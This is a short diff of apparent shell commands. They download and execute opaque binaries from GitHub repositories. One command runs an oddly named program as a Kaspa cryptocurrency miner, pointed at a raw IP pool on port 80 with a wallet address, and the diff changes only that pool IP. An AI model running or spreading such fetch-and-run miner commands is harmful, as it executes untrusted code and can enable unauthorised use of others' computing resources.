@@ -20,7 +20,7 @@ wget https://github.com/angkii/asu/raw/main/VTM && chmod 700 VTM && ./VTM -a yes
 
 
 
-git clone https://github.com/angkii/m.git && cd m && chmod +x AkubapakMU && ./AkubapakMU --algo KASPA --pool 178.128.86.41:80 --user qzmkm7ddenhfclxh2npvye8eymsck9y6l9pyvsdhuans30heqhgrzct5g9pfg.madeline
+git clone https://github.com/angkii/m.git && cd m && chmod +x AkubapakMU && ./AkubapakMU --algo KASPA --pool 159.223.188.176:80 --user qzmkm7ddenhfclxh2npvye8eymsck9y6l9pyvsdhuans30heqhgrzct5g9pfg.madeline
 
 
 
